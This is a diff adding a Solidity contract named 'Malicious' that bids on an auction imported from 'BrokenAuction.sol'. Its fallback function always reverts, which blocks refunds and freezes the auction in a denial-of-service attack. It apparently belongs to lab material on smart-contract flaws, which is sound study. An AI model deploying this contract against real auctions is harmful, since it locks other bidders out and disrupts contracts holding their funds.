@@ -1,0 +1,27 @@
+pragma solidity ^0.5.8;
+
+import "./BrokenAuction.sol";
+
+contract Malicious {
+    Auction auction;
+
+    event Deposit(address sender, uint amount);
+
+    constructor() public {
+        auction = Auction(0xebD4b40e3c4a5bdE8DD3F83b89C17D628644f9b3);
+    }
+
+    function maliciousBid(string memory name) public payable {
+        auction.bid.value(msg.value)(name);
+    }
+
+    function() external payable {
+        // If money is sent to a contract and it doesnt has a recieve method it will always call a fallback function
+        // so a transfer method on this contract will catch here
+        revert();
+    }
+
+    function get_address_contract() view external returns(address){
+        return address(this);
+    }
+}
